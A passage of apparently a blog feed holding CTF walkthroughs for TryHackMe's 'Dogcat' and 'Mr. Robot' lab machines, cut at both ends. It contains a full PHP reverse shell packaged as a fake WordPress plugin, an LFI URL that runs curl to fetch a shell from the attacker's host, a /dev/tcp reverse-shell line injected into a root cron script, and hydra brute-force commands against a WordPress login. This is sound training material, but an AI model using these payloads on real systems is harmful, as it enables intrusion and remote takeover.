class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Can't fork"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($pid) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (posix_setsid() == <span class="number">-1</span>) &#123;</span><br><span class="line">printit(<span class="string">"Error: Can't setsid()"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$daemon = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">printit(<span class="string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$sock) &#123;</span><br><span class="line">printit(<span class="string">"$errstr ($errno)"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource($process)) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Can't spawn shell"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line">stream_set_blocking($pipes[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($sock, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">"Successfully opened reverse shell to $ip:$port"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (feof($sock)) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Shell connection terminated"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (feof($pipes[<span class="number">1</span>])) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Shell process terminated"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">$read_a = <span class="keyword">array</span>($sock, $pipes[<span class="number">1</span>], $pipes[<span class="number">2</span>]);</span><br><span class="line">$num_changed_sockets = stream_select($read_a, $write_a, $error_a, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process's STDIN</span></span><br><span class="line"><span class="keyword">if</span> (in_array($sock, $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK READ"</span>);</span><br><span class="line">$input = fread($sock, $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK: $input"</span>);</span><br><span class="line">fwrite($pipes[<span class="number">0</span>], $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process's STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array($pipes[<span class="number">1</span>], $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT READ"</span>);</span><br><span class="line">$input = fread($pipes[<span class="number">1</span>], $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT: $input"</span>);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process's STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array($pipes[<span class="number">2</span>], $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR READ"</span>);</span><br><span class="line">$input = fread($pipes[<span class="number">2</span>], $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR: $input"</span>);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">fclose($pipes[<span class="number">2</span>]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> <span class="params">($string)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!$daemon) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$string\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Then I opened a http server in the directory I had the modified php shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p>Then download the file with curl:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=curl -o shell.php &#123;TUN0&#125;:8000/shell.php</span><br></pre></td></tr></table></figure><p>Before we open the file, we have to listen for incoming connection on the port we defined in the php shell on our machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp &#123;PORT&#125;</span><br></pre></td></tr></table></figure><p>Then open the shell on the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/shell.php</span><br></pre></td></tr></table></figure><p>Sadly we can’t stabilize that shell with some poor mans pentest, because python is not installed.</p><h2 id="Getting-Root"><a href="#Getting-Root" class="headerlink" title="Getting Root"></a>Getting Root</h2><p>Let’s just run some code to see if there are some SUIDs we can run:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>As you can see we can run /usr/bin/env with no password.</p><img src="/2020/07/11/Dogcat-TryHackMe/sudo.png" class="" title="sudo"><p>Give it a search on GTFOBins to see how we can get a root shell:</p><img src="/2020/07/11/Dogcat-TryHackMe/gtfobins.png" class="" title="GTFOBins"><p>And there you go, you got a root shell!</p><img src="/2020/07/11/Dogcat-TryHackMe/whoamiroot.png" class="" title="whoami"><h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag 3"></a>Flag 3</h3><p>The 3rd flag is in the <strong>/root</strong> directory. You can just cat it out, just like the previous ones.</p><img src="/2020/07/11/Dogcat-TryHackMe/flag3.png" class="" title="flag3"><h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag 4"></a>Flag 4</h3><p>The problem with the 4th flag is, that it is outside of this container. This might sound confusing, but the essence is, is that we just have to get another shell.</p><p>In /opt/backups we can se that there is a backup script that is run regularly to generate a backup.tar file. Let’s use this to genreate another reverse shell outside of this container.</p><p>We can easily exploit, that this script is run every other minute with root privileges, by inserting some code that will generate a reverse connection to us.<br>To insert this code into the script, simply run this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"#!/bin/bash"</span> &gt; /opt/backups/backup.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&#123;TUN0&#125;/8888 0&gt;&amp;1'"</span> &gt;&gt; /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p>And listen on port 8888 on your machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8888</span><br></pre></td></tr></table></figure><p>Now wait a few seconds (or minutes, for me it took just a few seconds) and you get another root shell.</p><img src="/2020/07/11/Dogcat-TryHackMe/secondRootShell.png" class="" title="SecondRootShell"><p>The fourth flag is in <strong>/root/flag4.txt</strong></p><img src="/2020/07/11/Dogcat-TryHackMe/flag4.png" class="" title="flag4"><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>And there you have it! I hope you had fun, I know I did 🦄</p>]]></content>
      
      
      <categories>
          
          <category> pentesting </category>
          
          <category> writeups </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mr. Robot CTF - TryHackMe</title>
      <link href="/2020/07/09/Mr-Robot-TryHackMe/"/>
      <url>/2020/07/09/Mr-Robot-TryHackMe/</url>
      
        <content type="html"><![CDATA[<p>Hey there! Today I am going to walk you through the Mr. Robot machine. I used the one on <a href="https://tryhackme.com/room/mrrobot" target="_blank" rel="noopener">TryHackMe</a>, but it is available on <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank" rel="noopener">Vulnhub</a> as well.</p><p>The first thing I always do (thanks to John Hammond) is to export the IP to a global variable. So $IP will refer to the target machine from now on.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> IP=&#123;Machine IP&#125;</span><br></pre></td></tr></table></figure><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Let us start our enumeration as usual and do an nmap scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oN nmap/initial <span class="variable">$IP</span></span><br></pre></td></tr></table></figure><p>This is what we are working with:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-08 11:13 EDT</span><br><span class="line">Nmap scan report for 10.10.99.113</span><br><span class="line">Host is up (0.046s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  closed ssh</span><br><span class="line">80&#x2F;tcp  open   http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">443&#x2F;tcp open   ssl&#x2F;http Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;www.example.com</span><br><span class="line">| Not valid before: 2015-09-16T10:45:03</span><br><span class="line">|_Not valid after:  2025-09-13T10:45:03</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 41.08 seconds</span><br></pre></td></tr></table></figure><p>We can see that there is a webserver up but there is nothing interesting at first glance, just some stuff about the Mr. Robot series.<br>Let’s run a dirbuster scan anyways.</p><h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h3><p>Also let’s have a look at the robots.txt file, as the hint for the first key is “robots”.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure><p>That seems interesting. We have the first key and we should probably also download the dictionary file. Maybe we will need it later.</p><h2 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h2><p>Meanwhile, our dirbuster results should have come back. We can see a lot of folders and files relating to a WordPress installation probably for a blog. Especially interesting is the “wp-login.php” file in the root of the webserver. Maybe we can get in that way with the credentials we downloaded earlier? Let us try that.<br>I used hydra with the following syntax:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L fsocity.dic -p <span class="built_in">test</span> <span class="variable">$IP</span> http-post-form <span class="string">"/wp-login/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F<span class="variable">$IP</span>%2Fwp-admin%2F&amp;testcookie=1:F=Invalid username"</span></span><br></pre></td></tr></table></figure><p>Basically what we are doing is, we are trying to get the username from the .dic file. Luckily with WordPress, we can see whether the password or the username was wrong, so we first bruteforce the username and then the corresponding password.<br>We are also telling hydra in which post parameter to insert the username and password. You can get the post parameters through burp suite.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hydra v8.8 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-07-08 11:20:46</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235&#x2F;p:1), ~53640 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;$IP:80&#x2F;wp-login&#x2F;:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2F$IP%2Fwp-admin%2F&amp;testcookie&#x3D;1:F&#x3D;Invalid username</span><br><span class="line">[80][http-post-form] host: $IP  login: Elliot   password: test</span><br></pre></td></tr></table></figure><p>Sweet! Now we got the user: <strong>Elliot</strong></p><p>Next, let us try to get the password!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l Elliot -P fsocity.dic <span class="variable">$IP</span> http-post-form <span class="string">"/wp-login/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F<span class="variable">$IP</span>%2Fwp-admin%2F&amp;testcookie=1:S=302"</span></span><br></pre></td></tr></table></figure><p>We are using the same syntax as before but using “Elliot” as the username and the .dic file as a wordlist for the password.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hydra v8.8 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-07-08 11:22:21</span><br><span class="line">[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1&#x2F;p:10), ~1 try per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;$IP:80&#x2F;wp-login&#x2F;:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2F$IP%2Fwp-admin%2F&amp;testcookie&#x3D;1:S&#x3D;302</span><br><span class="line">[...]</span><br><span class="line">[80][http-post-form] host: $IP   login: Elliot   password: ER28-0652</span><br></pre></td></tr></table></figure><p>Great! Now with the password (<strong>ER28-0652</strong>), it should be no problem to log in.</p><p>Once logged in we are greeted with the standard WordPress dashboard. Nothing has been done here, so it is quite empty. After looking around a bit I noticed that I could upload plugins. So why shouldn’t we upload our own special plugin 😅?</p><p>I just used the standard <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">php-reverse-shell</a> from pentestmonkey and modified it to my needs.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name:  Shelldon</span></span><br><span class="line"><span class="comment">Plugin URI: http://example.com</span></span><br><span class="line"><span class="comment">Description: Makes a Shelldon</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: me</span></span><br><span class="line"><span class="comment">Author URI: http://www.me.com</span></span><br><span class="line"><span class="comment">Text Domain: revshell</span></span><br><span class="line"><span class="comment">Domain Path: /languages</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">''</span>;  <span class="comment">// Your tun0 ip (ifconfig in terminal)</span></span><br><span class="line">$port = <span class="number">9999</span>;</span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">'pcntl_fork'</span>)) &#123;</span><br><span class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Can't fork"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($pid) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (posix_setsid() == <span class="number">-1</span>) &#123;</span><br><span class="line">printit(<span class="string">"Error: Can't setsid()"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$daemon = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">printit(<span class="string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 